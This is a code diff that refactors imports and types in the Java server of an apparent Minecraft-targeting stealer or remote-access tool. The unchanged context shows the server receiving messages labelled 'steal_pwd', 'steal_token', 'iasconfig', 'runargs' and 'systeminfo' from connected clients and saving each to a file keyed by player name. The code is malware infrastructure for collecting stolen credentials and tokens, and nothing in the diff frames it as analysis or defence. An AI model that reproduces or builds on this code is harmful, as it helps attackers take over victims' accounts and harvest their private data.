@@ -1,10 +1,13 @@
 package me.soda.witch.server.server;
 
 import com.google.gson.Gson;
-import me.soda.witch.shared.*;
+import me.soda.witch.shared.FileUtil;
+import me.soda.witch.shared.Info;
+import me.soda.witch.shared.Message;
+import me.soda.witch.shared.PlayerInfo;
 import me.soda.witch.shared.socket.Connection;
+import me.soda.witch.shared.socket.Packet;
 import me.soda.witch.shared.socket.TcpServer;
-import me.soda.witch.shared.socket.packet.DisconnectPacket;
 
 import java.io.File;
 import java.nio.charset.StandardCharsets;
@@ -42,7 +45,7 @@ public class Server extends TcpServer {
     }
 
     @Override
-    public void onClose(Connection conn, DisconnectPacket disconnectPacket) {
+    public void onClose(Connection conn, Packet.DisconnectPacket disconnectPacket) {
         log("Client disconnected: ID: " + clientMap.get(conn).index);
         try {
             clientMap.remove(conn);
@@ -77,7 +80,7 @@ public class Server extends TcpServer {
                     FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                 }
                 case "player" -> info.playerData = (PlayerInfo) msg;
-                case "ip" -> info.ip = (IP) msg;
+                case "ip" -> info.ip = (String) msg;
                 case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo", "props" -> {
                     String ext = msgType.equals("systeminfo") ? "txt" : "json";
                     File file = new File("data/data", getFileName(msgType, ext, info.playerData.playerName, true));
